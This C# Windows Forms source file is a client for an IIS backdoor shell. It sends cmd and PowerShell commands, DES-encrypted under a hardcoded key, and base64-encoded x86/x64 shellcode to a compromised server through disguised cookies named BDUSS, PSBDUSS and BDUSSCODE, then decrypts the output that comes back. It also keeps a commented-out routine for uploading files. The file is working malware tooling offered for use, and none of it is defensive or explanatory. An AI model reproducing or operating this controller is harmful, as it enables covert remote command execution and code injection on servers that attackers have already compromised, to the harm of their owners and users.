using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace IIS_backdoor_shell
{

    public partial class Form1 : Form
    {
        
        public Form1()
        {
            InitializeComponent();
            this.comboBox1.SelectedIndex = 0;
        }

        public string SendDataByGET(string Url, CookieContainer cookie)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
            if (cookie.Count == 0)
            {
                request.CookieContainer = new CookieContainer();
                cookie = request.CookieContainer;
            }
            else
            {
                request.CookieContainer = cookie;
            }

            request.Method = "GET";
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream myResponseStream = response.GetResponseStream();
            StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
            string retString = myStreamReader.ReadToEnd();
            myStreamReader.Close();
            myResponseStream.Close();

            return retString;
        }

        public string UploadFile(string Url, string Basefile)
        {
           
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
            request.Method = "GET";
            request.Headers.Add("USER-TOKEN", Basefile + "|");
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream myResponseStream = response.GetResponseStream();
            StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
            string retString = myStreamReader.ReadToEnd();
            myStreamReader.Close();
            myResponseStream.Close();

            return retString;
            
            /* POST上传

            WebClient w = new WebClient();
            System.Collections.Specialized.NameValueCollection VarPost = new System.Collections.Specialized.NameValueCollection();
            VarPost.Add("UPBDUSS", Basefile);
            byte[] byRemoteInfo = w.UploadValues(Url, "POST", VarPost);
            string retString = System.Text.Encoding.UTF8.GetString(byRemoteInfo);
             
            return retString;
            */

        }

        public string FileToBase64Str(string filePath)
        {
            string base64Str = string.Empty;
            try
            {
                using (FileStream filestream = new FileStream(filePath, FileMode.Open))
                {
                    byte[] bt = new byte[filestream.Length];

                    filestream.Read(bt, 0, bt.Length);
                    base64Str = Convert.ToBase64String(bt);
                    filestream.Close();
                }

                return base64Str;
            }
            catch
            {
                return base64Str;
            }
        }

        private void textBox1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Link;
            else
                e.Effect = DragDropEffects.None;
        }
        private void textBox1_DragDrop(object sender, DragEventArgs e)
        {
            ((TextBox)sender).Text = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();
        }

        private void button1_Click(object sender, System.EventArgs e)
        {
            DesString msg = new DesString();

            if (textBox3.Text!="" && textBox1.Text!="")
            {
                CookieContainer cc = new CookieContainer();
                //cc.Add(new System.Uri(textBox1.Text), new Cookie(comboBox1.Text, textBox3.Text));
                //textBox2.Text = SendDataByGET(textBox1.Text, cc);
                if (comboBox1.Text.Equals("shellcode_x86"))
                {
                    var base64Str = FileToBase64Str(textBox3.Text);
                    cc.Add(new System.Uri(textBox1.Text), new Cookie("BDUSSCODE", base64Str + "|x86"));
                    textBox2.Text = SendDataByGET(textBox1.Text, cc);
                }
                else if (comboBox1.Text.Equals("shellcode_x64"))
                {
                    var base64Str = FileToBase64Str(textBox3.Text);
                    cc.Add(new System.Uri(textBox1.Text), new Cookie("BDUSSCODE", base64Str + "|x64"));
                    textBox2.Text = SendDataByGET(textBox1.Text, cc);
                }
                else if (comboBox1.Text.Equals("cmd"))
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(textBox3.Text);
                    var enmsg = msg.Encrypt(System.Text.Encoding.Default.GetString(bytes));
                    //var base64Str = Convert.ToBase64String(bytes);

                    cc.Add(new System.Uri(textBox1.Text), new Cookie("BDUSS", enmsg));
                    //textBox2.Text = SendDataByGET(textBox1.Text, cc);
                    textBox2.Text = msg.Decrypt(SendDataByGET(textBox1.Text, cc));

                }
                else if (comboBox1.Text.Equals("powershell"))
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(textBox3.Text);
                    var enmsg = msg.Encrypt(System.Text.Encoding.Default.GetString(bytes));
                    cc.Add(new System.Uri(textBox1.Text), new Cookie("PSBDUSS", enmsg));
                    textBox2.Text = msg.Decrypt(SendDataByGET(textBox1.Text, cc));

                }

                /*
                else if (comboBox1.Text.Equals("upload"))
                {
                    cc.Add(new System.Uri(textBox1.Text), new Cookie("UPBDUSS", FileToBase64Str(textBox3.Text) + "|"));
                    textBox2.Text = SendDataByGET(textBox1.Text, cc);
                }
                else
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(textBox3.Text);
                    var base64Str = Convert.ToBase64String(bytes);
                    cc.Add(new System.Uri(textBox1.Text), new Cookie(comboBox1.Text, base64Str));
                    textBox2.Text = SendDataByGET(textBox1.Text, cc);
                }
                */
            }
            else
            {
                MessageBox.Show("请填写命令或URL地址");
            }
            

        }


        class DesString
        {
            static string encryptKey = "jqkA";//密钥（4位）

            public string Encrypt(string str)
            {

                try
                {
                    byte[] key = Encoding.Unicode.GetBytes(encryptKey);
                    byte[] data = Encoding.Unicode.GetBytes(str);

                    DESCryptoServiceProvider descsp = new DESCryptoServiceProvider();//加密、解密对象
                    MemoryStream MStream = new MemoryStream();//内存流对象

                    //用内存流实例化加密流对象
                    CryptoStream CStream = new CryptoStream(MStream, descsp.CreateEncryptor(key, key), CryptoStreamMode.Write);
                    CStream.Write(data, 0, data.Length);//向加密流中写入数据
                    CStream.FlushFinalBlock();//将数据压入基础流
                    byte[] temp = MStream.ToArray();//从内存流中获取字节序列
                    CStream.Close();
                    MStream.Close();

                    return Convert.ToBase64String(temp);
                }
                catch
                {
                    return str;
                }
            }

            public string Decrypt(string str)
            {
                try
                {
                    byte[] key = Encoding.Unicode.GetBytes(encryptKey);
                    byte[] data = Convert.FromBase64String(str);

                    DESCryptoServiceProvider descsp = new DESCryptoServiceProvider();//加密、解密对象
                    MemoryStream MStream = new MemoryStream();//内存流对象

                    //用内存流实例化解密流对象
                    CryptoStream CStream = new CryptoStream(MStream, descsp.CreateDecryptor(key, key), CryptoStreamMode.Write);
                    CStream.Write(data, 0, data.Length);//向加密流中写入数据
                    CStream.FlushFinalBlock();//将数据压入基础流
                    byte[] temp = MStream.ToArray();//从内存流中获取字节序列
                    CStream.Close();
                    MStream.Close();

                    return Encoding.Unicode.GetString(temp);
                }
                catch
                {
                    return str;
                }
            }

        }


        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
